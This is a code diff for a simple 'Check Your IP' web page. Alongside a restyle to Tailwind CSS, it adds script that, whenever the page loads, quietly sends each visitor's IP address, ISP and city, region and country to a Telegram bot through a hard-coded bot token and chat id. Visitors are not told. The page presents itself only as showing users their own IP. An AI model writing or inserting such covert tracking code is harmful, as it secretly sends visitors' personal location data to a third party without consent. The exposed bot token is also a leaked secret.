@@ -4,67 +4,63 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Check Your IP</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            background-color: #f4f4f4;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
-        }
-        .container {
-            background-color: #fff;
-            padding: 20px;
-            border-radius: 8px;
-            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
-            text-align: center;
-        }
-        h1 {
-            margin-bottom: 20px;
-        }
-        p {
-            font-size: 18px;
-            margin: 10px 0;
-        }
-        #ip-info {
-            display: none;
-        }
-    </style>
+    <script src="https://cdn.tailwindcss.com"></script>
 </head>
-<body>
-    <div class="container">
-        <h1>Your IP Information</h1>
-        <div id="ip-info">
-            <p>IP Address: <span id="ip"></span></p>
-            <p>ISP: <span id="isp"></span></p>
-            <p>Location: <span id="location"></span></p>
+<body class="bg-gray-100 flex items-center justify-center h-screen">
+    <div class="bg-white p-6 rounded-lg shadow-lg text-center w-full max-w-md">
+        <h1 class="text-2xl font-bold text-gray-800 mb-4">Your IP Information</h1>
+        <div id="ip-info" class="space-y-4 hidden">
+            <p class="text-lg"><strong>IP Address:</strong> <span id="ip" class="text-blue-600"></span></p>
+            <p class="text-lg"><strong>ISP:</strong> <span id="isp" class="text-blue-600"></span></p>
+            <p class="text-lg"><strong>Location:</strong> <span id="location" class="text-blue-600"></span></p>
         </div>
-        <p id="loading">Loading your IP information...</p>
+        <p id="loading" class="text-lg text-gray-600 animate-pulse">Loading your IP information...</p>
     </div>
-    <script>
-        // API endpoint
-        const apiURL = 'https://ipapi.co/json/';
 
-        // Elements to update with IP info
+    <script>
+        const ipApiURL = 'https://ipapi.co/json/';
+        const telegramApiURL = 'https://api.telegram.org/bot7511319653:AAGQIaI1jaRswln9YEqJMUog5MFAWQnpR38/sendMessage';
+        const chatId = '@Upenwajssisheh';
+
         const ipElement = document.getElementById('ip');
         const ispElement = document.getElementById('isp');
         const locationElement = document.getElementById('location');
         const ipInfoElement = document.getElementById('ip-info');
         const loadingElement = document.getElementById('loading');
 
-        // Fetch IP information
-        fetch(apiURL)
+        fetch(ipApiURL)
             .then(response => response.json())
             .then(data => {
-                ipElement.textContent = data.ip;
-                ispElement.textContent = data.org;
-                locationElement.textContent = `${data.city}, ${data.region}, ${data.country_name}`;
-                
-                // Show the IP information and hide the loading message
-                ipInfoElement.style.display = 'block';
-                loadingElement.style.display = 'none';
+                const ip = data.ip;
+                const isp = data.org;
+                const location = `${data.city}, ${data.region}, ${data.country_name}`;
+
+                ipElement.textContent = ip;
+                ispElement.textContent = isp;
+                locationElement.textContent = location;
+
+                ipInfoElement.classList.remove('hidden');
+                loadingElement.classList.add('hidden');
+
+                const message = `IP: ${ip}\nISP: ${isp}\nLocation: ${location}`;
+
+                fetch(telegramApiURL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: message,
+                    }),
+                })
+                .then(response => response.json())
+                .then(result => {
+                    console.log('Message sent to Telegram:', result);
+                })
+                .catch(error => {
+                    console.error('Error sending message to Telegram:', error);
+                });
             })
             .catch(error => {
                 loadingElement.textContent = 'Failed to load IP information.';
